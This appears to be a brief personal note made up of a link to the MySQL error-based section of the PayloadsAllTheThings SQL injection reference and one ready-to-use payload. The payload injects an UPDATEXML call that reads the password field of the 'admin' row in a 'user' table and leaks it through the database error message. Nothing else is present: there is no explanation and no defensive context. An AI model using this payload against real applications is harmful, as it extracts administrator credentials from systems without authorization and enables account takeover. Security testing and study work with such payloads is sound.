https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based

```
' AND UPDATEXML(rand(),CONCAT(CHAR(126), (SELECT upw FROM user WHERE uid='admin'), CHAR(126)),null)-- 
```